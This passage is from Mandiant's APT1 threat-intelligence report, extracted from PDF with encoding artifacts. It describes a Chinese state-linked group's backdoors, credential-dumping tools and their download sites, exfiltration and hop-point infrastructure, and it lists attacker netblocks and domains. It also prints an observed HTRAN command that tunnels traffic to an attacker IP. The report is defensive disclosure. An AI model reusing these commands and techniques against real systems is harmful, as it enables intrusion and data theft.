reason why some security companies refer to APT1 as the ﬁComment Crew.ﬂ A WEBC2 backdoor is designed to retrieve a webpage from a C2 server. It expects the webpage to contain special HTML tags; the backdoor will attempt to interpret the data between the tags as commands. Older versions of WEBC2 read data between HTML comments, though over time WEBC2 variants have evolved to read data contained within other types of tags. From direct observation, we can con˜rm that APT1 was using WEBC2 backdoors as early as July 2006. However, the ˜rst compile time 35 we have for WEBC2-KT3 is 2004-01-23, suggesting that APT1 has been crafting WEBC2 backdoors since early 2004. Based on the 400+ samples of WEBC2 variants that we have accumulated, it appears that APT1 has direct access to developers who have continually released new WEBC2 variants for over six years. For example, these two build paths, which were discovered inside WEBC2-TABLE samples, help to illustrate how APT1 has been steadily building new WEBC2 variants as part of a continuous development process:Sample ACompile date: 2012-02-23 winApplication2009-8-7\\\\mywork\\\\ aaaaaaa2012-2-23\\\\Release\\\\aaaaaaa.pdbSample BMD5: c1393e77773a48b1eea117a302138554 Compile date: 2009-08-07 winApplication2009-8-7\\\\mywork\\\\aaaaaaa\\\\Release\\\\ aaaaaaa.pdb 35 ﬁCompileﬂ refers to the process of transforming a programmer™s source code into a ˜le that a computer can understand and execute. The compile date is easily accessible in the PE header of the resulting executable ˜le unless the intruder takes additional steps to obfuscate it.WEBC2 familiesWEBC2-AUSOVWEBC2-ADSPACE WEBC2-BOLID WEBC2-CLOVER WEBC2-CSON WEBC2-DIV WEBC2-GREENCAT WEBC2-HEADWEBC2-KT3 WEBC2-QBP WEBC2-RAVE WEBC2-TABLE WEBC2-TOCK WEBC2-UGX WEBC2-YAHOO WEBC2-Y21K– and many still uncategorizedWhat is a malware family?A malware family is a collection of malware in which each sample shares a signi˜cant amount of code with all of the others. To help illustrate this, consider the following example from the physical world. There is now a vast array of computing tablets for sale. These include Apple™s iPad, Samsung™s Galaxy Tab, and Microsoft™s Surface. Although these are all tablet computers, ﬁunder the hoodﬂ they are probably quite different. However, one can expect that an iPad 1 and an iPad 2 share a signi˜cant number of components Š much more than, say, an iPad 1 and a Microsoft Surface. Thus it makes sense to refer to the iPad ﬁfamilyﬂ and the Surface ﬁfamilyﬂ. When it comes to computer programs, in general if they share more than 80% of the same code we consider them part of the same family. There are exceptions: for example, some ˜les contain public and standard code libraries that we do not take into consideration when making a family determination. Mandiant APT1 32 www.mandiant.com A ﬁbuild pathﬂ discloses the directory from which the programmer built and compiled his source code. These samples, compiled 2.5 years apart, were compiled within a folder named ﬁwork\\\\code\\\\...\\\\ myworkﬂ. The instances of ﬁworkﬂ suggest that working on WEBC2 is someone™s day job and not a side project or hobby. Furthermore, the Sample A build string includes ﬁ2012-2-23ﬂ Š which matches Sample A™s compile date. The Sample B build string lacks ﬁ2012-2-23ﬂ but includes ﬁ2009-8-7ﬂ Š which also matches Sample B™s compile date. This suggests that the code used to compile Sample A was modi˜ed from code that was used to compile Sample B 2.5 years previously. The existence of ﬁ2008-7-8ﬂ suggests that the code for both samples was modi˜ed from a version that existed in July 2008, a year before Sample B was created. This series of dates indicates that developing and modifying the WEBC2 backdoor is an iterative and long-term process.WEBC2 backdoors typically give APT1 attackers a short and rudimentary set of commands to issue to victim systems, including:»Open an interactive command shell (usually Windows™ cmd.exe)»Download and execute a ˜le»Sleep (i.e. remain inactive) for a speci˜ed amount of timeWEBC2 backdoors are often packaged with spear phishing emails. Once installed, APT1 intruders have the option to tell victim systems to download and execute additional malicious software of their choice. WEBC2 backdoors work for their intended purpose, but they generally have fewer features than the ﬁStandard Backdoorsﬂ described below. Standard BackdoorsThe standard, non-WEBC2 APT1 backdoor typically communicates using the HTTP protocol (to blend in with legitimate web traf˜c) or a custom protocol that the malware authors designed themselves. These backdoors give APT intruders a laundry list of ways to control victim systems, including:»Create/modify/delete/execute programs»Upload/download ˜les»Create/delete directories»List/start/stop processes»Modify the system registry »Take screenshots of the user™s desktop »Capture keystrokes»Capture mouse movement»Start an interactive command shell»Create a Remote desktop (i.e. graphical) interface»Harvest passwords»Enumerate users»Enumerate other systems on the network»Sleep (i.e. go inactive) for a speci˜ed amount of time»Log off the current user»Shut down the systemSEASALTLONGRUNWEBC2.TOCKWEBC2.YAHOOWARPTABMSGSQLWEBC2.CSONWEBC2.QBPCOMBOSWEBC2.DIVCOOKIEBAGGLOOXMAILMINIASPBOUNCERWEBC2.TABLEWEBC2.BOLIDKURTONCALENDARGDOCUPLOADLIGHTBOLTWEBC2.Y21KWEBC2.KT32004LIGHTDART20052006MAPIGETBISCUITMANITSMEWEBC2.UGXSTARSYPOUNDTARSIPDAIRYSWORDHELAUTOWEBC2.AUSOVHACKSFASEAURIGAWEBC2.CLOVERGREENCATMACROMAILGOGGLESNEWSREELSWEBC2.RAVEWEBC2.ADSPACEWEBC2.HEADBANGAT200720082009201020112012APT 1 MALWARE FAMILIESGETMAILFIRST KNOWN COMPILE TIMES Mandiant APT1 33 www.mandiant.com The BISCUIT backdoor (so named for the command ﬁbdkztﬂ) is an illustrative example of the range of commands that APT1 has built into its ﬁstandardﬂ backdoors. APT1 has used and steadily modi˜ed BISCUIT since as early as 2007 and continues to use it presently. TABLE 4: A subset of BISCUIT commandsCommandDescriptionLaunch a command shellGet system informationdownload Transfer a ˜le from the C2 server exe Launch a program as a speci˜c userexitClose the connection and sleeplists <type>List servers on a Windows network. ljcEnumerate running processes and identify their owners.sjc Terminate a process, either by process ID or by process name. upload Send a ˜le to the C2 server<input>Send input to the command shell process (launched with ﬁbdkztﬂ).These functions are characteristic of most backdoors, and are not limited to APT1 or even APT. For example, anyone who wants to control a system remotely will likely put functions like ﬁUpload/download ˜lesﬂ into a backdoor. Covert CommunicationsSome APT backdoors attempt to mimic legitimate Internet traf˜c other than the HTTP protocol. APT1 has created a handful of these, including:TABLE 5: Backdoors that mimic legitimate communication protocolsBackdoor Mimicked protocolMACROMAIL MSN MessengerGLOOXMAIL Jabber/XMPPCALENDAR Gmail CalendarWhen network defenders see the communications between these backdoors and their C2 servers, they might easily dismiss them as legitimate network traf˜c. Additionally, many of APT1™s backdoors use SSL encryption so that communications are hidden in an encrypted SSL tunnel. We have provided APT1™s public SSL certi˜cates in Appendix F so people can incorporate them into their network signatures. Mandiant APT1 34 www.mandiant.com Privilege EscalationEscalating privileges involves acquiring items (most often usernames and passwords) that will allow access to more resources within the network. In this and the next two stages, APT1 does not differ signi˜cantly from other APT intruders (or intruders, generally). APT1 predominantly uses publicly available tools to dump password hashes from victim systems in order to obtain legitimate user credentials.APT1 has used these privilege escalation tools:TABLE 6: Publicly available privilege escalation tools that APT1 has usedTool Description Websitecachedump This program extracts cached password hashes from a system™s registry Currently packaged with fgdump (below)fgdump Windows password hash dumper http://www.foofus.net/˜zzgig/fgdump/ gsecdump Obtains password hashes from the Windows registry, including the SAM ˜le, cached domain credentials, and LSA secrets http://www.truesec.se lslsass Dump active logon session password hashes from the lsass process http://www.truesec.se mimikatz A utility primarily used for dumping password hashes http://blog.gentilkiwi.com/mimikatzpass-the-hash toolkit Allows an intruder to ﬁpassﬂ a password hash (without knowing the original password) to log in to systems http://oss.coresecurity.com/projects/pshtoolkit.htm pwdump7 Dumps password hashes from the Windows registry http://www.tarasco.org/security/pwdump_7/ pwdumpX Dumps password hashes from the Windows registry The tool claims its origin as http://reedarvin.thearvins.com/, but the site is not offering this software as of the date of this report Mandiant APT1 35 www.mandiant.com Internal ReconnaissanceIn the Internal Reconnaissance stage, the intruder collects information about the victim environment. Like most APT (and non-APT) intruders, APT1 primarily uses built-in operating system commands to explore a compromised system and its networked environment. Although they usually simply type these commands into a command shell, sometimes intruders may use batch scripts to speed up the process. Figure 18 below shows the contents of a batch script that APT1 used on at least four victim networks. FIGURE 18: An APT1 batch script that automates reconnaissanceWhat is a password hash?When a person logs in to a computer, website, email server, or any networked resource requiring a password, the supplied password needs to be veri˜ed. One way to do this would be to store the person™s actual password on the system that the person is trying to access, and to compare the typed password to the stored password. Although simple, this method is also very insecure: anyone who can access that same system will be able to see the person™s password. Instead, systems that verify passwords usually store password hashes. In simple terms, a password hash is a number that is mathematically generated from the person™s password. The mathematical methods (algorithms) used to generate password hashes will create values that are unique for all practical purposes. When a person supplies their password, the computer generates a hash of the typed password and compares it to the stored hash. If they match, the passwords are presumed to be the same and the person is allowed to log in.It is supposed to be impossible to ﬁreverseﬂ a hash to obtain the original password. However, it is possible with enough computational resources to ﬁcrackﬂ password hashes to discover the original password. (ﬁCrackingﬂ generally consists of guessing a large number of passwords, hashing them, and comparing the generated hashes to the existing hashes to see if any match.) Intruders will steal password hashes from victim systems in hopes that they can either use the hashes as-is (by ﬁpassing-the-hashﬂ) or crack them to discover users™ passwords. Mandiant APT1 36 www.mandiant.com This script performs the following functions and saves the results to a text ˜le:»Display the victim™s network con˜guration information »List the services that have started on the victim system»List currently running processes»List accounts on the system»List accounts with administrator privileges»List current network connections»List currently connected network shares»List other systems on the network»List network computers and accounts according to group (ﬁdomain controllers,ﬂ ﬁdomain users,ﬂ ﬁdomain admins,ﬂ etc.)Lateral MovementOnce an APT intruder has a foothold inside the network and a set of legitimate credentials,36 it is simple for the intruder to move around the network undetected:»They can connect to shared resources on other systems»They can execute commands on other systems using the publicly available ﬁpsexecﬂ tool from Microsoft Sysinternals or the built-in Windows Task Scheduler (ﬁat.exeﬂ) These actions are hard to detect because legitimate system administrators also use these techniques to perform actions around the network.Maintain PresenceIn this stage, the intruder takes actions to ensure continued, long-term control over key systems in the network environment from outside of the network. APT1 does this in three ways.1. Install new backdoors on multiple systemsThroughout their stay in the network (which could be years), APT1 usually installs new backdoors as they claim more systems in the environment. Then, if one backdoor is discovered and deleted, they still have other backdoors they can use. We usually detect multiple families of APT1 backdoors scattered around a victim network when APT1 has been present for more than a few weeks.2. Use legitimate VPN credentialsAPT actors and hackers in general are always looking for valid credentials in order to impersonate a legitimate user. We have observed APT1 using stolen usernames and passwords to log into victim networks™ VPNs when the VPNs are only protected by single-factor authentication. From there they are able to access whatever the impersonated users are allowed to access within the network.36 Mandiant uses the term ﬁcredentialsﬂ to refer to a userid and its corresponding, working password. Mandiant APT1 37 www.mandiant.com 3. Log in to web portalsOnce armed with stolen credentials, APT1 intruders also attempt to log into web portals that the network offers. This includes not only restricted websites, but also web-based email systems such as Outlook Web Access. Completing The MissionSimilar to other APT groups we track, once APT1 ˜nds ˜les of interest they pack them into archive ˜les before stealing them. APT intruders most commonly use the RAR archiving utility for this task and ensure that the archives are password protected. Sometimes APT1 intruders use batch scripts to assist them in the process, as depicted in Figure 19. (The instances of ﬁXXXXXXXXﬂ obfuscate the text that was in the actual batch script.) del *.vbs del %0FIGURE 19: An APT1 batch script that bundles stolen ˜les into RAR archive ˜lesAfter creating ˜les compressed via RAR, the APT1 attackers will transfer ˜les out of the network in ways that are consistent with other APT groups, including using the File Transfer Protocol (FTP) or their existing backdoors. Many times their RAR ˜les are so large that the attacker splits them into chunks before transferring them. Figure 19 above shows a RAR command with the option ﬁ-v200mﬂ, which means that the RAR ˜le should be split up into 200MB portions..rarFIGURE 20: APT1 bundles stolen ˜les into RAR archives before moving data to China Mandiant APT1 38 www.mandiant.com Unlike most other APT groups we track, APT1 uses two email-stealing utilities that we believe are unique to APT1. The ˜rst, GETMAIL, was designed speci˜cally to extract email messages, attachments, and folders from within Microsoft Outlook archive (ﬁPSTﬂ) ˜les. Microsoft Outlook archives can be large, often storing years™ worth of emails. They may be too large to transfer out of a network quickly, and the intruder may not be concerned about stealing every email. The GETMAIL utility allows APT1 intruders the ˛exibility to take only the emails between dates of their choice. In one case, we observed an APT1 intruder return to a compromised system once a week for four weeks in a row to steal only the past week™s emails. Whereas GETMAIL steals email in Outlook archive ˜les, the second utility, MAPIGET, was designed speci˜cally to steal email that has not yet been archived and still resides on a Microsoft Exchange Server. In order to operate successfully, MAPIGET requires username/password combinations that the Exchange server will accept. MAPIGET extracts email from speci˜ed accounts into text ˜les (for the email body) and separate attachments, if there are any. English As A Second LanguageAPT1™s ﬁIt™s legitﬂ email should not mislead someone into thinking that APT1 personnel are all ˛uent in English, though some undoubtedly are. Their own digital weapons betray the fact that they were programmed by people whose ˜rst language is not English. Here are some examples of grammatically incorrect phrases that have made it into APT1™s tools over the years.TABLE 7: Examples of grammatically incorrect phrases in APT1 malwarePhrase Tool Compile dateIf use it, key is the KEY.

We have evidence suggesting that APT1 manually controls thousands of systems in support of their attacks, and have directly observed their control over hundreds of these systems. Although they control systems in dozens of countries, their attacks originate from four large networks in Shanghai Š two of which are allocated directly to the Pudong New Area, the home of Unit 61398. The sheer number of APT1 IP addresses concentrated in these Shanghai ranges, coupled with Simpli˜ed Chinese keyboard layout settings on APT1™s attack systems, betrays the true location and language of the operators. To help manage the vast number of systems they control, APT1 has registered hundreds of domain names, the majority of which also point to a Shanghai locale. The domain names and IP addresses together comprise APT1™s command and control framework which they manage in concert to camou˛age their true origin from their English speaking targets.APT1 Network OriginsWe are frequently asked why it is an ineffective security measure to just block all IP addresses in China from connecting to your network. To put it simply, it is easy for APT1 attackers to bounce or ﬁhopﬂ through intermediary systems such that they almost never connect to a victim network directly from their systems in Shanghai. Using their immense infrastructure, they are able to make it appear to victims that an attack originates from almost any country they choose. The systems in this type of network redirection infrastructure have come to be called ﬁhop pointsﬂ or ﬁhops.ﬂ Hop points are most frequently compromised systems that APT1 uses, in some instances for years, as camou˛age for their attacks without the knowledge of the systems™ owners. These systems belong to third-party victims who are compromised for access to infrastructure, as opposed to direct victims who are compromised for their data and intellectual property. FIGURE 21: APT1 bounces through ﬁhop pointﬂ systems before accessing victim systems Mandiant APT1 40 www.mandiant.com We have observed some of APT1™s activities after they cross into (virtual) U.S. territory. They access hop points using a variety of techniques, the most popular being Remote Desktop and FTP. Over a two-year period (January 2011 to January 2013) we con˜rmed 1,905 instances of APT1 actors logging into their hop infrastructure from 832 different IP addresses with Remote Desktop. Remote Desktop provides a remote user with an interactive graphical interface to a system. The experience is similar to the user actually physically sitting at the system and having direct access to the desktop, keyboard, and mouse. Of the 832 IP addresses, 817 (98.2%) were Chinese and belong predominantly to four large net blocks in Shanghai which we will refer to as APT1™s home networks.TABLE 8: Net blocks corresponding to IP addresses that APT1 used to access their hop pointsNumber Net block Registered Owner 445 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network 217 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 114 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 12 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 1 114.80.0.0 - 114.95.255.255 China Telecom Shanghai Network 1 101.80.0.0 - 101.95.255.255 China Telecom Shanghai Network 27 Other (non-Shanghai) Chinese IPs Notably, the registration information for the second and third net blocks above includes this contact information at the end:e-mail: sh-ipmaster@chinaunicom.cnphone: +086-021-61201616country: cnThe registration information for these two net blocks suggests that they serve the Pudong New Area of Shanghai, where PLA Unit 61398 is headquartered. The other 15 of the 832 IP addresses are registered to organizations in the U.S. (12), Taiwan (1), Japan (1) and Korea (1). We have con˜rmed that some of these systems are part of APT1™s hop infrastructure and not legitimately owned by APT1 Š in other words, APT1 accessed one hop from another hop, as opposed to accessing the hop directly from Shanghai.In order to make a user™s experience as seamless as possible, the Remote Desktop protocol requires client applications to forward several important details to the server, including their client hostname and the client keyboard layout. In 1,849 of the 1,905 (97%) APT1 Remote Desktop sessions we observed in the past two years, the keyboard layout setting was ﬁChinese (Simpli˜ed) Š US Keyboard.ﬂ Microsoft™s Remote Desktop client con˜gures this setting automatically based on the selected language on the client system, making it nearly certain that the APT1 actors managing the hop infrastructure are doing so with Simpli˜ed Chinese (zh-cn) input settings. ﬁSimpli˜ed Chineseﬂ is a streamlined set of the traditional Chinese characters that have been in use since the 1950s, originating in mainland China. Taiwan and municipalities such as Hong Kong still use ﬁTraditional Chineseﬂ (zh-tw) character sets. The overwhelming concentration of Shanghai IP addresses and Simpli˜ed Chinese language settings clearly indicate that APT1 intruders are mainland Chinese speakers with ready access to large networks in Shanghai. The only Mandiant APT1 41 www.mandiant.com alternative is that APT1 has intentionally been conducting a years-long deception campaign to impersonate Chinese speakers from Shanghai in places where victims are not reasonably expected to have any visibility Œ and without making a single mistake that might indicate their ﬁtrueﬂ identity. Interaction with BackdoorsAs we just mentioned, APT1 attackers typically use hops to connect to and control victim systems. Victim backdoors regularly connect out to hop points, waiting for the moment that the attacker is there to give them commands. However, exactly how this works is often speci˜c to the tools they are using. MANUAL WEBC2 UPDATES As covered in the previous ﬁAttack Lifecycleﬂ section, WEBC2 backdoor variants download and interpret data stored between tags in HTML pages as commands. They usually download HTML pages from a system within APT1™s hop infrastructure. We have observed APT1 intruders logging in to WEBC2 servers and manually editing the HTML pages that backdoors will download. Because the commands are usually encoded and dif˜cult to spell from memory, APT1 intruders typically do not type these strings, but instead copy and paste them into the HTML ˜les. They likely generate the encoded commands on their own systems before pasting them in to an HTML ˜le hosted by the hop point. For example, we observed an APT attacker pasting the string ﬁczo1NA==ﬂ into an HTML page. That string is the base64- encoded version of ﬁs:54ﬂ, meaning ﬁsleep for 54 minutesﬂ (or hours, depending on the particular backdoor). In lieu of manually editing an HTML ˜le on a hop point, we have also observed APT1 intruders uploading new (already-edited) HTML ˜les. HTRANWhen APT1 attackers are not using WEBC2, they require a ﬁcommand and controlﬂ (C2) user interface so they can issue commands to the backdoor. This interface sometimes runs on their personal attack system, which is typically in Shanghai. In these instances, when a victim backdoor makes contact with a hop, the communications need to be forwarded from the hop to the intruder™s Shanghai system so the backdoor can talk to the C2 server software. We have observed 767 separate instances in which APT1 intruders used the publicly available ﬁHUC Packet Transmit Toolﬂ or HTRAN on a hop. As always, keep in mind that these uses are con˜rmed uses, and likely represent only a small fraction of APT1™s total activity. The HTRAN utility is merely a middle-man, facilitating connections between the victim and the attacker who is using the hop point.0100100001010010000101010100010101010001C2HTRANFIGURE 22: The HTRAN tool resides on APT1 hop points and acts as a middle-man Mandiant APT1 42 www.mandiant.com Typical use of HTRAN is fairly simple: the attacker must specify the originating IP address (of his or her workstation in Shanghai), and a port on which to accept connections. For example, the following command, which was issued by an APT1 actor, will listen for incoming connections on port 443 on the hop and automatically proxy them to the Shanghai IP address 58.247.242.254 on port 443:htran -tran 443 58.247.242.254 443In the 767 observed uses of HTRAN, APT1 intruders supplied 614 distinct routable IP addresses. In other words, they used their hops to function as middlemen between victim systems and 614 different addresses. Of these addresses, 613 of 614 are part of APT1™s home networks: TABLE 9: Net blocks corresponding to IP addresses used to receive HTRAN communications Number Net block Registered Owner340 223.166.0.0 - 223.167.255.255 China Unicom Shanghai Network 160 58.246.0.0 - 58.247.255.255 China Unicom Shanghai Network 102 112.64.0.0 - 112.65.255.255 China Unicom Shanghai Network 11 139.226.0.0 - 139.227.255.255 China Unicom Shanghai Network 1 143.89.0.0 - 143.89.255.255 Hong Kong University of Science and Technology C2 SERVER SOFTWARE ON HOP INFRASTRUCTUREOccasionally, APT1 attackers have installed C2 server components on systems in their hop infrastructure rather than forwarding connections back to C2 servers in Shanghai. In these instances they do not need to use a proxy tool like HTRAN to interact with victim systems. However, it does mean that the intruders need to be able to interface with the (often graphical) C2 server software running on the hop. We have observed APT1 intruders log in to their hop point, start the C2 server, wait for incoming connections, and then proceed to give commands to victim systems. WEBC2 variants may include a server component that provides a simple C2 interface to the intruder. This saves the intruder from having to manually edit webpages. That is, this server component receives connections from victim backdoors, displays them to the intruder, and then translates the intruder™s commands into HTML tags that the victim backdoors read. Mandiant APT1 43 www.mandiant.com APT1 ServersIn the last two years alone, we have con˜rmed 937 APT1 C2 servers Š that is, actively listening or communicating programs Š running on 849 distinct IP addresses. However, we have evidence to suggest that APT1 is running hundreds, and likely thousands, of other servers (see the Domains section below). The programs acting as APT1 servers have mainly been: (1) FTP, for transferring ˜les; (2) web, primarily for WEBC2; (3) RDP, for remote graphical control of a system; (4) HTRAN, for proxying; and (5) C2 servers associated with various backdoor families (covered in Appendix C: The Malware Arsenal).

In the same way that people program named contacts into their cell phones and no longer need to remember phone numbers, DNS allows people to remember names like ﬁgoogle.comﬂ instead of IP addresses. When a person types ﬁgoogle.comﬂ into a web browser, a DNS translation to an IP address occurs so that the person™s computer can communicate with Google. Names that can be translated through DNS to IP addresses are referred to as Fully Quali˜ed Domain Names (FQDNs).0100100001010010000101010100010101010001ug-co.hugesoft.org 10100100101001011001100100011010100 1001100100011 DNS QUERY ﬁHere™s the IP addressﬂC2FIGURE 24: DNS queries are used to resolve APT1 FQDNs to many C2 server IPs Mandiant APT1 45 www.mandiant.com APT1™s infrastructure includes FQDNs in addition to the IP addresses discussed above. The FQDNs play an important role in their intrusion campaigns because APT1 embeds FQDNs as C2 addresses within their backdoors. In the last several years we have con˜rmed 2,551 FQDNs attributed to APT1. Of these, we have redacted FQDNs that implicated victims by name and provided 2,046 in Appendix D. By using FQDNs rather than hard- coded IP addresses as C2 addresses, attackers may dynamically decide where to direct C2 connections from a given backdoor. That is, if they lose control of a speci˜c hop point (IP address) they can ﬁpointﬂ the C2 FQDN address to a different IP address and resume their control over victim backdoors. This ˛exibility allows the attacker to direct victim systems to myriad C2 servers and avoid being blocked.APT1 FQDNs can be grouped into three categories: (1) registered zones, (2) third-party zones, and (3) hijacked domains. REGISTERED ZONESA DNS zone represents a collection of FQDNs that end with the same name, and which are usually registered through a domain registration company and controlled by a single owner. For example, ﬁhugesoft.orgﬂ is an FQDN but also represents a zone. The FQDNs ﬁug-co.hugesoft.orgﬂ and ﬁ7cback.hugesoft.orgﬂ are part of the ﬁhugesoft. orgﬂ zone and are called ﬁsubdomainsﬂ of the zone. The person who registered ﬁhugesoft.orgﬂ may add as many subdomains as they wish and controls the IP resolutions of these FQDNs. APT1 has registered at least 107 zones since 2004. Within these zones, we know of thousands of FQDNs that have resolved to hundreds of IP addresses (which we suspect are hops) and in some instances to APT1™s source IP addresses in Shanghai.The ˜rst zone we became aware of was ﬁhugesoft.orgﬂ, which was registered through eNom, Inc. in October 2004. The registrant supplied ﬁuglygorilla@163.comﬂ as an email address. The supplied registration information, which is still visible in public ﬁwhoisﬂ data as of February 3, 2013, includes the following:APT1 Zone Registrationshugesoft.orgustvb.comuszzcs.comhvmetal.comhkcastte.comattnpower.comifexcel.combpyoyo.comskyswim.netcslisten.combigish.netchileexe77.comissnbgkit.netprogammerli.comidirectech.comlivemymsn.comwebservicesupdate.comgiftnews.orgonefastgame.netconferencesinfo.com5 zones createdcometoway.org6 zones created6 zones createdusnftc.orgphoenixtvus.comushongkong.orgnewsesport.comyouipcam.comolmusic100.comtodayusa.orgbluecoate.com4 zones createdbigdepression.netarrowservice.netblackcake.netbusinessconsults.netinfosupports.comnewsonet.netpurpledaily.comavvmail.comshepmas.comsyscation.comtibethome.orgmicrosoft-update-info.combusketball.comcomrepair.netgmailboxes.comoplaymagzine.commaltempata.comnirvanaol.com7 zones createdcnndaily.commyyahoonews.comsatellitebbs.commsnhome.orgusabbs.orgns06.net6 zones createdcopporationnews.com7 zones creatednytimesnews.netcnnnewsdaily.comapplesoftupdate.com4 zones createdmicyuisyahooapis.cominfobusinessus.org200420052006200720082009201020112012 Mandiant APT1 46 www.mandiant.com The supplied registrant information does not need to be accurate for the zone to be registered successfully. For example, ﬁshanghaiﬂ is not a street name. Nevertheless, it is noteworthy that Shanghai appeared in the ˜rst known APT1 domain registration, along with a phone number that begins with China™s ﬁ+86ﬂ international code. In fact, Shanghai was listed as the registrant™s city in at least 24 of the 107 (22%) registrations. Compare this to the frequency with which other cities appeared in APT1 zone registration information:TABLE 10: Locations supplied in registration data other than Shanghai, ChinaNumber City State Country7 Beijing - China5 Calgary Canada 4 Guizhou - China4 Pasadena CA US4 Houston TX US3 Sydney Australia3 Salt Lake UT US3 Washington, DC US2 Homewood AL US2 Kalkaska MI US2 Shallotte NC US2 Yellow Spring OH US2 New York NY US2 Provo UT US2 Shenzhen - China1 Birmingham AL US1 Scottsdale AZ US1 Sunnyvale CA US1 Albany NY US1 Pearl River NY US1 Chicago - US1 Moscow - Guatemala1 Nanning - China1 Wuhua - China27 Registration information blocked or not available Mandiant APT1 47 www.mandiant.com Some of the supplied registration information is obviously false. For example, consider the registration information supplied for the zone ﬁuszzcs.comﬂ in 2005: Victor etejedaa@yahoo.com +86.8005439436 Michael MurphyHere, a phone number with a Chinese pre˜x (ﬁ+86ﬂ) accompanied an address in the United States. Since the United States uses the pre˜x ﬁ+1ﬂ, it is highly unlikely that a person living in Ohio would provide a phone number beginning with ﬁ+86ﬂ. Additionally, the city name is spelled incorrectly, as it should be ﬁYellow Springsﬂ instead of ﬁYellow Springﬂ. This could have been attributed to a one-time spelling mistake, except the registrant spelled the city name incorrectly multiple times, both for the zones ﬁuszzcs.comﬂ and ﬁattnpower.comﬂ. This suggests that the registrant really thought ﬁYellow Springﬂ was the correct spelling and that he or she did not, in fact, live or work in Yellow Springs, Ohio. Overall, the combination of a relatively high number of ﬁShanghaiﬂ registrations with obviously false registration examples in other registrations suggests a partially uncoordinated domain registration campaign from 2004 until present, in which some registrants tried to fabricate non-Shanghai locations but others did not. This is supported by contextual information on the Internet for the email address ﬁlfengg@163.com,ﬂ which was supplied in the registration information for seven of the 107 zones. On the site ﬁwww.china-one.org,ﬂ the email address ﬁlfengg@163.comﬂ appears as the contact for the Shanghai Kai Optical Information Technology Co., Ltd., a website production company located in a part of Shanghai that is across the river from PLA Unit 61398. FIGURE 25: An email address used to register APT1 zones is also a contact for a Shanghai company Mandiant APT1 48 www.mandiant.com Naming ThemesAbout half of APT1™s known zones were named according to three themes: news, technology and business. These themes cause APT1 command and control addresses to appear benign at ˜rst glance. However, we believe that the hundreds of FQDNs within these zones were created for the purpose of APT1 intrusions. (Note: these themes are not unique to APT1 or even APT in general.) The news-themed zones include the names of well-known news media outlets such as CNN, Yahoo and Reuters. However, they also include names referencing English-speaking countries, such as ﬁaunewsonline.comﬂ (Australia), ﬁcanadatvsite.comﬂ (Canada), and ﬁtodayusa.orgﬂ (U.S.). Below is a list of zones registered by APT1 that are news- themed:aoldaily.comaunewsonline.com canadatvsite.com canoedaily.com cnndaily.com cnndaily.net cnnnewsdaily.com mediaxsds.net myyahoonews.com newsesport.com newsonet.net newsonlinesite.com nytimesnews.net phoenixtvus.compurpledaily.com reutersnewsonline.com sportreadok.net usapappers.com usnewssite.com yahoodaily.comThe technology-themed zones reference well-known technology companies (AOL, Apple, Google, Microsoft), antivirus vendors (McAfee, Symantec), and products (Blackberry, Bluecoat). APT1 also used more generic names referencing topics like software:aolon1ine.com blackberrycluter.com bluecoate.com comrepair.net downloadsite.me idirectech.com livemymsn.com micyuisyahooapis.com pcclubddk.net symanteconline.net webservicesupdate.comFinally, some zones used by APT1 re˛ect a business theme. The names suggest websites that professionals might visit: advanbusiness.combusinessconsults.net copporationnews.com jobsadvanced.comNot every zone stays within APT1™s control forever. Over a campaign lasting for so many years, APT1 has not always renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, others have been transferred to the organizations that the domain names attempted to imitate. For example, in September 2011, Yahoo ˜led a complaint against ﬁzheng youjunﬂ of ﬁArizona, USAﬂ, who registered the APT1 zone ﬁmyyahoonews.comﬂ.37 Yahoo alleged the ﬁ<myyahoonews.com> domain name was confusingly similar to Complainant™s YAHOO! markﬂ and that ﬁzheng youjun registered and used the <myyahoonews.com> domain name in bad faith.ﬂ In response, the National Arbitration Forum found that the site ﬁmyyahoonews.comﬂ at the time resolved 37 Yahoo! Inc. v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (October 31, 2011) (Tyrus R. Atkinson, Jr., panelist), http:// domains.adrforum.com/domains/decisions/1409001.htm, accessed February 6, 2013. Mandiant APT1 49 www.mandiant.com to ﬁa phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials under false pretenses.ﬂ Not surprisingly, ﬁzheng youjunﬂ did not respond. Subsequently, control of ﬁmyyahoonews. comﬂ was transferred from APT1 to Yahoo. Third-Party ServicesThe third-party service that APT1 has used the most is known as ﬁdynamic DNS.ﬂ This is a service that allows people to register subdomains under zones that other people have registered and provided to the service. Over the years, APT1 has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they simply log in to these services and update the IP resolution of their FQDN via a web-based interface.In addition to dynamic DNS, recently we have observed that APT1 has been creating FQDNs that end with ﬁappspot.comﬂ, suggesting that they are using Google™s App Engine service. Hijacked FQDNsAPT1 intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We consider these domains to be ﬁhijackedﬂ because they were registered by someone for a legitimate reason, but have been leveraged by APT1 for malicious purposes. APT1 uses hijacked FQDNs for two main purposes. First, they place malware (usually in ZIP ˜les) on the legitimate websites hosted on the hop point and then send spear phishing emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their backdoors. EVIDENCE OF A VAST INFRASTRUCTUREAs noted above, we have con˜rmed the existence of 937 servers (listening applications) hosted on 849 distinct IP addresses, with the majority of IP addresses registered to organizations in China (709), followed by the U.S. (109). In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not ﬁsinkholeﬂ38 or ﬁdomain parkingﬂ39 IP addresses:»United States: 559»China: 263»Taiwan: 25 »Korea: 22»United Kingdom: 14»Canada: 12»Other: 8338 A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.39 Some IP addresses are used for ﬁdomain parkingﬂ once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when the zone expires. These IP addresses usually host advertisements. Mandiant APT1 50 www.mandiant.com The vast majority of the Chinese IP addresses again belong to APT1™s home networks, meaning that in some instances APT1 intruders probably communicated directly to victim systems from their Shanghai systems, bypassing their hop infrastructure:TABLE 11: APT1 FQDNs have resolved to IP addresses within these Chinese net blocks Number Net block Registered Owner150223.166.0.0 - 223.167.255.255 